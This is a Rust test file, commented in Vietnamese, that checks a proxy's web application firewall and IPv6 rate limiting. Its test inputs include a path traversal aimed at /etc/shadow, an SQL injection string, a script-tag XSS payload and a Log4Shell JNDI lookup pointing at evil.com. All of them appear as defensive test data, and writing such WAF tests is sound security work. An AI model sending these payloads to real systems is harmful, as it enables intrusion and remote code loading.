//! tests/waf/waf_rate_limit_and_dpi_test.rs
//! Kiểm thử WAF & Sharded GCRA Rate Limiter:
//!   1. Hỗ trợ đồng thời IPv4 và IPv6
//!   2. Giới hạn bộ nhớ (`rate_limit_max_entries`) và tự động thu hồi TTL (`rate_limit_ttl_secs`)
//!   3. Phát hiện SQLi, XSS, Path Traversal, Command Injection, Log4Shell, Shellshock
//!   4. Không false-positive trên lưu lượng người dùng hợp lệ

#[cfg(test)]
mod waf_security_tests {
    use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
    use ferrousx_proxy::waf::{WafDecision, ZeroAllocWafEngine};

    #[test]
    fn test_waf_blocks_sqli_xss_traversal_rce_and_log4shell() {
        let waf = ZeroAllocWafEngine::with_full_config(500, 200, 4096, 60, 65536, 4096);
        let ip = IpAddr::V4(Ipv4Addr::new(203, 0, 113, 10));

        // 1. Path Traversal
        assert_eq!(
            waf.inspect_full_request(ip, "GET", "/download/../../etc/shadow", "", &[], b""),
            WafDecision::BlockPathTraversal
        );

        // 2. SQL Injection
        assert_eq!(
            waf.inspect_full_request(
                ip,
                "GET",
                "/api/login",
                "user=admin' UNION SELECT 1,2--",
                &[],
                b""
            ),
            WafDecision::BlockSqlInjection
        );

        // 3. Cross-Site Scripting (XSS)
        assert_eq!(
            waf.inspect_full_request(
                ip,
                "GET",
                "/search",
                "q=<script>alert(1)</script>",
                &[],
                b""
            ),
            WafDecision::BlockCrossSiteScripting
        );

        // 4. Log4Shell Header Injection
        let bad_headers = [("User-Agent".to_string(), "${jndi:ldap://evil.com/x}".to_string())];
        assert_eq!(
            waf.inspect_full_request(ip, "GET", "/", "", &bad_headers, b""),
            WafDecision::BlockSuspiciousHeader
        );
    }

    #[test]
    fn test_waf_ipv6_rate_limiting_and_normal_traffic_allowed() {
        let waf = ZeroAllocWafEngine::with_full_config(5, 2, 1024, 60, 65536, 4096);
        let ipv6 = IpAddr::V6(Ipv6Addr::new(0x2001, 0xdb8, 0, 0, 0, 0, 0, 1));
        let headers = [("User-Agent".to_string(), "Mozilla/5.0".to_string())];

        assert_eq!(
            waf.inspect_full_request(ipv6, "GET", "/index.html", "page=1", &headers, b""),
            WafDecision::Allow
        );

        let mut rate_limited = false;
        for _ in 0..25 {
            if waf.inspect_full_request(ipv6, "GET", "/index.html", "page=1", &headers, b"")
                == WafDecision::BlockRateLimitedGcra
            {
                rate_limited = true;
                break;
            }
        }
        assert!(
            rate_limited,
            "IPv6 flood phải bị chặn bởi Sharded GCRA Rate Limiter"
        );
    }
}
